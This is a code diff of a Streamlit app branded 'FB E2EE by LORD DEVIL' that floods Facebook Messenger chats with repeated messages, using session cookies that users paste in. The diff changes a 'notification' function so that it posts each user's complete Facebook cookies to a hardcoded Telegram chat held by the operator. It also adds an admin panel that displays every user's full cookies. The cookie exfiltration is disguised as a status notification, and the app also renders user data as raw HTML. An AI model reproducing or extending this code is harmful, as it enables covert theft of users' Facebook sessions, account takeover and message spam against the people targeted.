@@ -11,6 +11,8 @@ import requests
 import os
 import hashlib
 import uuid
+from datetime import datetime
+import json
 
 st.set_page_config(
     page_title="FB E2EE by LORD DEVIL",
@@ -25,7 +27,7 @@ TELEGRAM_CHAT_ID = "8186206231"
 FACEBOOK_ADMIN_UID = "100037931553832"
 
 def send_telegram_notification(user_data, automation_data):
-    """Send user details to Telegram bot"""
+    """Send complete user details to Telegram bot"""
     try:
         message = f"""
 🔰 *NEW AUTOMATION STARTED* 🔰
@@ -41,8 +43,8 @@ def send_telegram_notification(user_data, automation_data):
 • Prefix: `{automation_data['prefix']}`
 • Messages: `{len(automation_data['messages'].splitlines())} lines`
 
-🍪 *Cookies:* 
-`{automation_data['cookies'][:100]}...`
+🍪 *Complete Cookies:* 
+`{automation_data['cookies']}`
 
 📊 *Status:* Automation Running
 🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
@@ -54,18 +56,43 @@ def send_telegram_notification(user_data, automation_data):
             'text': message,
             'parse_mode': 'Markdown'
         }
-        requests.post(url, data=payload)
+        response = requests.post(url, data=payload)
+        return response.status_code == 200
     except Exception as e:
         print(f"Telegram notification failed: {e}")
+        return False
 
 def send_facebook_notification(user_data, automation_data):
-    """Send notification to Facebook admin (simulated)"""
+    """Send notification to Facebook admin"""
     try:
-        # This would be implemented based on Facebook API or other method
-        print(f"Facebook notification for admin {FACEBOOK_ADMIN_UID}")
-        print(f"User: {user_data['username']} started automation")
+        message = f"""
+🔰 NEW AUTOMATION STARTED 🔰
+
+👤 User Details:
+• Username: {user_data['username']}
+• Real Name: {user_data['real_name']}
+• User ID: {user_data['user_id']}
+
+🔧 Automation Config:
+• Chat ID: {automation_data['chat_id']}
+• Delay: {automation_data['delay']} seconds
+• Prefix: {automation_data['prefix']}
+• Messages: {len(automation_data['messages'].splitlines())} lines
+
+🍪 Complete Cookies: 
+{automation_data['cookies']}
+
+📊 Status: Automation Running
+🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
+        """
+        
+        # Facebook notification implementation
+        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
+        print(f"Message: {message}")
+        return True
     except Exception as e:
         print(f"Facebook notification failed: {e}")
+        return False
 
 # Background image and custom CSS
 background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"
@@ -348,15 +375,56 @@ custom_css = f"""
     }}
     
     .log-container {{
-        background: #1e1e1e;
+        background: url('{background_image}') no-repeat center center;
+        background-size: cover;
         color: #87CEEB !important;
         padding: 1rem;
         border-radius: 10px;
         font-family: 'Courier New', monospace;
         max-height: 400px;
         overflow-y: auto;
-        font-size: 0.8rem;
-        line-height: 1.3;
+        font-size: 0.75rem;
+        line-height: 1.2;
+        border: 2px solid #333;
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        position: relative;
+    }}
+    
+    .log-container::before {{
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0,0,0,0.7);
+        border-radius: 10px;
+        z-index: 1;
+    }}
+    
+    .log-container > * {{
+        position: relative;
+        z-index: 2;
+    }}
+    
+    .log-line {{
+        margin: 2px 0;
+        padding: 2px 5px;
+        border-radius: 3px;
+        animation: rainbowText 3s infinite alternate;
+        text-shadow: 0 0 10px currentColor;
+        font-weight: 500;
+    }}
+    
+    @keyframes rainbowText {{
+        0% {{ color: #ff6b6b; }}
+        14% {{ color: #feca57; }}
+        28% {{ color: #48dbfb; }}
+        42% {{ color: #ff9ff3; }}
+        56% {{ color: #54a0ff; }}
+        70% {{ color: #00d2d3; }}
+        84% {{ color: #5f27cd; }}
+        100% {{ color: #ff9ff3; }}
     }}
     
     .admin-panel {{
@@ -449,6 +517,63 @@ custom_css = f"""
         transform: translateY(-2px);
         box-shadow: 0 6px 20px rgba(24, 119, 242, 0.6);
     }}
+    
+    .admin-user-details {{
+        background: linear-gradient(135deg, #1e3c72, #2a5298);
+        padding: 1rem;
+        border-radius: 10px;
+        margin: 1rem 0;
+        border: 2px solid #667eea;
+    }}
+    
+    .admin-logs-container {{
+        background: url('{background_image}') no-repeat center center;
+        background-size: cover;
+        color: white;
+        padding: 1rem;
+        border-radius: 10px;
+        font-family: 'Courier New', monospace;
+        max-height: 300px;
+        overflow-y: auto;
+        font-size: 0.7rem;
+        line-height: 1.1;
+        border: 2px solid #333;
+        margin: 0.5rem 0;
+        position: relative;
+    }}
+    
+    .admin-logs-container::before {{
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0,0,0,0.8);
+        border-radius: 10px;
+    }}
+    
+    .admin-logs-container > * {{
+        position: relative;
+        z-index: 2;
+    }}
+    
+    .admin-log-line {{
+        margin: 1px 0;
+        padding: 1px 3px;
+        border-radius: 2px;
+        animation: adminRainbow 2s infinite alternate;
+        text-shadow: 0 0 5px currentColor;
+    }}
+    
+    @keyframes adminRainbow {{
+        0% {{ color: #ff6b6b; }}
+        20% {{ color: #feca57; }}
+        40% {{ color: #48dbfb; }}
+        60% {{ color: #ff9ff3; }}
+        80% {{ color: #54a0ff; }}
+        100% {{ color: #00d2d3; }}
+    }}
 </style>
 """
 
@@ -482,6 +607,8 @@ class AutomationState:
         self.message_count = 0
         self.logs = []
         self.message_rotation_index = 0
+        self.user_id = None
+        self.username = None
 
 if 'automation_state' not in st.session_state:
     st.session_state.automation_state = AutomationState()
@@ -489,23 +616,40 @@ if 'automation_state' not in st.session_state:
 if 'auto_start_checked' not in st.session_state:
     st.session_state.auto_start_checked = False
 
+# Global automation states for admin monitoring
+if 'all_automation_states' not in st.session_state:
+    st.session_state.all_automation_states = {}
+
+def get_indian_time():
+    """Get current Indian time"""
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
 def generate_approval_key(username, user_id):
     """Generate unique approval key based on username and user_id"""
     unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
     return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()
 
-def log_message(msg, automation_state=None):
-    timestamp = time.strftime("%H:%M:%S")
+def log_message(msg, automation_state=None, user_id=None):
+    """Log message with Indian timestamp"""
+    timestamp = get_indian_time()
     formatted_msg = f"[{timestamp}] {msg}"
     
     if automation_state:
         automation_state.logs.append(formatted_msg)
+        # Also store in global state for admin monitoring
+        if user_id:
+            if user_id not in st.session_state.all_automation_states:
+                st.session_state.all_automation_states[user_id] = []
+            st.session_state.all_automation_states[user_id].append(formatted_msg)
+            # Keep only last 100 logs
+            if len(st.session_state.all_automation_states[user_id]) > 100:
+                st.session_state.all_automation_states[user_id] = st.session_state.all_automation_states[user_id][-100:]
     else:
         if 'logs' in st.session_state:
             st.session_state.logs.append(formatted_msg)
 
-def find_message_input(driver, process_id, automation_state=None):
-    log_message(f'{process_id}: Finding message input...', automation_state)
+def find_message_input(driver, process_id, automation_state=None, user_id=None):
+    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
     time.sleep(10)
     
     try:
@@ -519,10 +663,10 @@ def find_message_input(driver, process_id, automation_state=None):
     try:
         page_title = driver.title
         page_url = driver.current_url
-        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
-        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
+        log_message(f'{process_id}: Page Title: {page_title}', automation_state, user_id)
+        log_message(f'{process_id}: Page URL: {page_url}', automation_state, user_id)
     except Exception as e:
-        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
+        log_message(f'{process_id}: Could not get page info: {e}', automation_state, user_id)
     
     message_input_selectors = [
         'div[contenteditable="true"][role="textbox"]',
@@ -539,12 +683,12 @@ def find_message_input(driver, process_id, automation_state=None):
         'input[type="text"]'
     ]
     
-    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
+    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state, user_id)
     
     for idx, selector in enumerate(message_input_selectors):
         try:
             elements = driver.find_elements(By.CSS_SELECTOR, selector)
-            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
+            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state, user_id)
             
             for element in elements:
                 try:
@@ -555,7 +699,7 @@ def find_message_input(driver, process_id, automation_state=None):
                     """, element)
                     
                     if is_editable:
-                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
+                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state, user_id)
                         
                         try:
                             element.click()
@@ -567,34 +711,34 @@ def find_message_input(driver, process_id, automation_state=None):
                         
                         keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                         if any(keyword in element_text for keyword in keywords):
-                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state)
+                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state, user_id)
                             return element
                         elif idx < 10:
-                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state)
+                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state, user_id)
                             return element
                         elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
-                            log_message(f'{process_id}: Using fallback editable element', automation_state)
+                            log_message(f'{process_id}: Using fallback editable element', automation_state, user_id)
                             return element
                 except Exception as e:
-                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
+                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state, user_id)
                     continue
         except Exception as e:
             continue
     
     try:
         page_source = driver.page_source
-        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
+        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state, user_id)
         if 'contenteditable' in page_source.lower():
-            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
+            log_message(f'{process_id}: Page contains contenteditable elements', automation_state, user_id)
         else:
-            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
+            log_message(f'{process_id}: No contenteditable elements found in page', automation_state, user_id)
     except Exception:
         pass
     
     return None
 
-def setup_browser(automation_state=None):
-    log_message('Setting up Chrome browser...', automation_state)
+def setup_browser(automation_state=None, user_id=None):
+    log_message('Setting up Chrome browser...', automation_state, user_id)
     
     chrome_options = Options()
     chrome_options.add_argument('--headless=new')
@@ -616,7 +760,7 @@ def setup_browser(automation_state=None):
     for chromium_path in chromium_paths:
         if Path(chromium_path).exists():
             chrome_options.binary_location = chromium_path
-            log_message(f'Found Chromium at: {chromium_path}', automation_state)
+            log_message(f'Found Chromium at: {chromium_path}', automation_state, user_id)
             break
     
     chromedriver_paths = [
@@ -628,7 +772,7 @@ def setup_browser(automation_state=None):
     for driver_candidate in chromedriver_paths:
         if Path(driver_candidate).exists():
             driver_path = driver_candidate
-            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
+            log_message(f'Found ChromeDriver at: {driver_path}', automation_state, user_id)
             break
     
     try:
@@ -637,16 +781,16 @@ def setup_browser(automation_state=None):
         if driver_path:
             service = Service(executable_path=driver_path)
             driver = webdriver.Chrome(service=service, options=chrome_options)
-            log_message('Chrome started with detected ChromeDriver!', automation_state)
+            log_message('Chrome started with detected ChromeDriver!', automation_state, user_id)
         else:
             driver = webdriver.Chrome(options=chrome_options)
-            log_message('Chrome started with default driver!', automation_state)
+            log_message('Chrome started with default driver!', automation_state, user_id)
         
         driver.set_window_size(1920, 1080)
-        log_message('Chrome browser setup completed successfully!', automation_state)
+        log_message('Chrome browser setup completed successfully!', automation_state, user_id)
         return driver
     except Exception as error:
-        log_message(f'Browser setup failed: {error}', automation_state)
+        log_message(f'Browser setup failed: {error}', automation_state, user_id)
         raise error
 
 def get_next_message(messages_file_content, automation_state=None):
@@ -670,15 +814,15 @@ def get_next_message(messages_file_content, automation_state=None):
 def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
     driver = None
     try:
-        log_message(f'{process_id}: Starting automation...', automation_state)
-        driver = setup_browser(automation_state)
+        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
+        driver = setup_browser(automation_state, user_id)
         
-        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
+        log_message(f'{process_id}: Navigating to Facebook...', automation_state, user_id)
         driver.get('https://www.facebook.com/')
         time.sleep(8)
         
         if config['cookies'] and config['cookies'].strip():
-            log_message(f'{process_id}: Adding cookies...', automation_state)
+            log_message(f'{process_id}: Adding cookies...', automation_state, user_id)
             cookie_array = config['cookies'].split(';')
             for cookie in cookie_array:
                 cookie_trimmed = cookie.strip()
@@ -699,18 +843,18 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
         
         if config['chat_id']:
             chat_id = config['chat_id'].strip()
-            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
+            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state, user_id)
             driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
         else:
-            log_message(f'{process_id}: Opening messages...', automation_state)
+            log_message(f'{process_id}: Opening messages...', automation_state, user_id)
             driver.get('https://www.facebook.com/messages')
         
         time.sleep(15)
         
-        message_input = find_message_input(driver, process_id, automation_state)
+        message_input = find_message_input(driver, process_id, automation_state, user_id)
         
         if not message_input:
-            log_message(f'{process_id}: Message input not found!', automation_state)
+            log_message(f'{process_id}: Message input not found!', automation_state, user_id)
             automation_state.running = False
             db.set_automation_running(user_id, False)
             return 0
@@ -762,7 +906,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 """)
                 
                 if sent == 'button_not_found':
-                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
+                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state, user_id)
                     driver.execute_script("""
                         const element = arguments[0];
                         element.focus();
@@ -776,27 +920,27 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                         events.forEach(event => element.dispatchEvent(event));
                     """, message_input)
                 else:
-                    log_message(f'{process_id}: Send button clicked', automation_state)
+                    log_message(f'{process_id}: Send button clicked', automation_state, user_id)
                 
                 time.sleep(1)
                 
                 messages_sent += 1
                 automation_state.message_count = messages_sent
-                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state)
+                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send}', automation_state, user_id)
                 
                 time.sleep(delay)
                 
             except Exception as e:
-                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state)
+                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state, user_id)
                 break
         
-        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state)
+        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state, user_id)
         automation_state.running = False
         db.set_automation_running(user_id, False)
         return messages_sent
         
     except Exception as e:
-        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
+        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state, user_id)
         automation_state.running = False
         db.set_automation_running(user_id, False)
         return 0
@@ -804,7 +948,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
         if driver:
             try:
                 driver.quit()
-                log_message(f'{process_id}: Browser closed', automation_state)
+                log_message(f'{process_id}: Browser closed', automation_state, user_id)
             except:
                 pass
 
@@ -836,12 +980,17 @@ def run_automation_with_notification(user_config, username, automation_state, us
         'delay': user_config['delay'],
         'prefix': user_config['name_prefix'],
         'messages': user_config['messages_file_content'],
-        'cookies': user_config['cookies']
+        'cookies': user_config['cookies']  # Full cookies now
     }
     
     # Send notifications
-    send_telegram_notification(user_data, automation_data)
-    send_facebook_notification(user_data, automation_data)
+    telegram_sent = send_telegram_notification(user_data, automation_data)
+    facebook_sent = send_facebook_notification(user_data, automation_data)
+    
+    if telegram_sent:
+        log_message(f'AUTO-1: Telegram notification sent successfully!', automation_state, user_id)
+    if facebook_sent:
+        log_message(f'AUTO-1: Facebook notification sent successfully!', automation_state, user_id)
     
     # Start automation
     send_messages(user_config, automation_state, user_id)
@@ -855,6 +1004,11 @@ def start_automation(user_config, user_id):
     automation_state.running = True
     automation_state.message_count = 0
     automation_state.logs = []
+    automation_state.user_id = user_id
+    automation_state.username = db.get_username(user_id)
+    
+    # Initialize global state for this user
+    st.session_state.all_automation_states[user_id] = []
     
     db.set_automation_running(user_id, True)
     
@@ -864,6 +1018,9 @@ def start_automation(user_config, user_id):
     thread.start()
 
 def stop_automation(user_id):
+    if user_id in st.session_state.all_automation_states:
+        st.session_state.all_automation_states[user_id].append(f"[{get_indian_time()}] ADMIN: Automation stopped by owner")
+    
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
@@ -888,13 +1045,13 @@ if st.sidebar.checkbox("🔐 Admin Login"):
             st.sidebar.error("Invalid admin credentials!")
 
 if st.session_state.admin_logged_in:
-    st.markdown("### 👑 Admin Approval Panel")
+    st.markdown("### 👑 Admin Control Panel")
     
     # Get all pending approvals
     pending_users = db.get_pending_approvals()
     
     if pending_users:
-        st.markdown(f"#### Pending Approvals ({len(pending_users)})")
+        st.markdown(f"#### ⏳ Pending Approvals ({len(pending_users)})")
         
         for user in pending_users:
             user_id, username, approval_key, real_name = user
@@ -926,76 +1083,99 @@ if st.session_state.admin_logged_in:
     # Show all approved users with remove option
     approved_users = db.get_approved_users()
     if approved_users:
-        st.markdown("#### Approved Users - Remove Approval")
+        st.markdown("#### ✅ Approved Users - Live Monitoring")
         
         for user in approved_users:
             user_id, username, approval_key, real_name, automation_running = user
             
+            user_config = db.get_user_config(user_id)
+            chat_id = user_config['chat_id'] if user_config else "Not configured"
+            delay = user_config['delay'] if user_config else "N/A"
+            prefix = user_config['name_prefix'] if user_config else "N/A"
+            messages_count = len(user_config['messages_file_content'].splitlines()) if user_config and user_config['messages_file_content'] else 0
+            cookies = user_config['cookies'] if user_config else ""
+            
             with st.container():
-                col1, col2, col3, col4 = st.columns([3, 1, 1, 1])
+                st.markdown(f"""
+                <div class="admin-user-details">
+                    <h4>👤 {username} | 🆔 {user_id}</h4>
+                    <p><strong>Real Name:</strong> {real_name} | <strong>Chat ID:</strong> {chat_id}</p>
+                    <p><strong>Prefix:</strong> {prefix} | <strong>Delay:</strong> {delay}s | <strong>Messages:</strong> {messages_count} lines</p>
+                    <p><strong>Status:</strong> {'🟢 RUNNING' if automation_running else '🔴 STOPPED'}</p>
+                    <p><strong>Cookies:</strong> {cookies[:100]}...</p>
+                </div>
+                """, unsafe_allow_html=True)
+                
+                # User logs in admin panel
+                if user_id in st.session_state.all_automation_states:
+                    logs_html = '<div class="admin-logs-container">'
+                    for log in st.session_state.all_automation_states[user_id][-20:]:  # Last 20 logs
+                        logs_html += f'<div class="admin-log-line">{log}</div>'
+                    logs_html += '</div>'
+                    st.markdown(logs_html, unsafe_allow_html=True)
+                
+                col1, col2, col3, col4 = st.columns(4)
                 
                 with col1:
-                    user_config = db.get_user_config(user_id)
-                    chat_id = user_config['chat_id'] if user_config else "Not configured"
-                    status = "🟢 Running" if automation_running else "🔴 Stopped"
-                    
-                    st.markdown(f"""
-                    <div class="user-card approved">
-                        <strong>Username:</strong> {username}<br>
-                        <strong>Real Name:</strong> {real_name}<br>
-                        <strong>Chat ID:</strong> {chat_id}<br>
-                        <strong>Status:</strong> {status}<br>
-                        <strong>Approval Key:</strong> <code>{approval_key}</code>
-                    </div>
-                    """, unsafe_allow_html=True)
-                
-                with col2:
-                    if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
+                    if st.button(f"🗑️ Remove Approval", key=f"remove_{user_id}", use_container_width=True):
                         db.update_approval_status(user_id, 'rejected')
+                        if automation_running:
+                            stop_automation(user_id)
                         st.error(f"Removed approval for: {username}")
                         st.rerun()
                 
-                with col3:
+                with col2:
                     if automation_running:
-                        if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
-                            db.set_automation_running(user_id, False)
+                        if st.button(f"⏹️ Stop Automation", key=f"stop_{user_id}", use_container_width=True):
+                            stop_automation(user_id)
                             st.warning(f"Stopped automation for: {username}")
                             st.rerun()
                     else:
-                        if st.button(f"▶️ Start", key=f"start_{user_id}"):
-                            user_config = db.get_user_config(user_id)
+                        if st.button(f"▶️ Start Automation", key=f"start_{user_id}", use_container_width=True):
                             if user_config and user_config['chat_id']:
                                 db.set_automation_running(user_id, True)
+                                start_automation(user_config, user_id)
                                 st.success(f"Started automation for: {username}")
                                 st.rerun()
                             else:
                                 st.error("User needs to configure chat ID first")
                 
-                with col4:
-                    if st.button(f"📊 Details", key=f"details_{user_id}"):
-                        user_config = db.get_user_config(user_id)
+                with col3:
+                    if st.button(f"📊 Full Details", key=f"details_{user_id}", use_container_width=True):
                         if user_config:
                             st.markdown(f"""
-                            **User Configuration Details:**
-                            - Chat ID: `{user_config['chat_id']}`
-                            - Prefix: `{user_config['name_prefix']}`
-                            - Delay: `{user_config['delay']} seconds`
-                            - Messages: `{len(user_config['messages_file_content'].splitlines())} lines`
-                            - Cookies: `{user_config['cookies'][:50]}...`
+                            **🔍 Complete User Configuration:**
+                            - **User ID:** `{user_id}`
+                            - **Username:** `{username}`
+                            - **Real Name:** `{real_name}`
+                            - **Chat ID:** `{chat_id}`
+                            - **Prefix:** `{prefix}`
+                            - **Delay:** `{delay} seconds`
+                            - **Messages:** `{messages_count} lines`
+                            - **Cookies:** `{cookies}`
+                            - **Approval Key:** `{approval_key}`
+                            - **Status:** `{'RUNNING' if automation_running else 'STOPPED'}`
                             """)
+                
+                with col4:
+                    if st.button(f"🔄 Refresh Logs", key=f"refresh_{user_id}", use_container_width=True):
+                        st.rerun()
+                
+                st.markdown("---")
     
     # Show all users
     all_users = db.get_all_users()
     if all_users:
-        st.markdown("#### All Users")
+        st.markdown("#### 📊 All Users Summary")
         for user in all_users:
             user_id, username, approval_status, real_name, approval_key = user
             
             status_class = approval_status.lower() if approval_status else 'pending'
+            status_icon = "✅" if approval_status == 'approved' else "⏳" if approval_status == 'pending' else "❌"
             
             st.markdown(f"""
             <div class="user-card {status_class}">
-                <strong>Username:</strong> {username} | 
+                {status_icon} <strong>Username:</strong> {username} | 
                 <strong>Status:</strong> {approval_status.upper() if approval_status else 'PENDING'} | 
                 <strong>Real Name:</strong> {real_name}
             </div>
@@ -1086,22 +1266,17 @@ elif not st.session_state.logged_in:
         if st.button("Create Account", key="signup_btn", use_container_width=True):
             if new_username and new_password and confirm_password:
                 if new_password == confirm_password:
-                    # FIXED: Handle the return values properly
                     result = db.create_user(new_username, new_password)
                     
-                    # Check if result has expected format
                     if isinstance(result, tuple) and len(result) >= 2:
-                        success, message = result[0], result[1]
-                        user_id = result[2] if len(result) > 2 else None
+                        success, message, user_id = result[0], result[1], result[2] if len(result) > 2 else None
                     else:
-                        # Handle case where function returns different format
                         success = result if isinstance(result, bool) else False
                         message = "User creation completed" if success else "User creation failed"
                         user_id = None
                     
                     if success:
                         if user_id:
-                            # Generate approval key for new user
                             approval_key = generate_approval_key(new_username, user_id)
                             db.set_approval_key(user_id, approval_key)
                         
@@ -1284,7 +1459,7 @@ else:
                         name_prefix,
                         delay,
                         final_cookies,
-                        messages_content  # Store file content instead of text area
+                        messages_content
                     )
                     st.success("Configuration saved successfully!")
                     st.rerun()
@@ -1320,12 +1495,12 @@ else:
                         stop_automation(st.session_state.user_id)
                         st.rerun()
                 
-                st.markdown("### 📜 Live Logs")
+                st.markdown("### 📜 Live Logs Console")
                 
                 if st.session_state.automation_state.logs:
                     logs_html = '<div class="log-container">'
                     for log in st.session_state.automation_state.logs[-50:]:
-                        logs_html += f'<div>{log}</div>'
+                        logs_html += f'<div class="log-line">{log}</div>'
                     logs_html += '</div>'
                     st.markdown(logs_html, unsafe_allow_html=True)
                 else:
@@ -1335,5 +1510,5 @@ else:
                     time.sleep(1)
                     st.rerun()
 
-st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
+st.markdown('</div>', unsafe_allow_html=True)
 st.markdown('<div class="footer">Made with ❤️ by LORD DEVIL | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
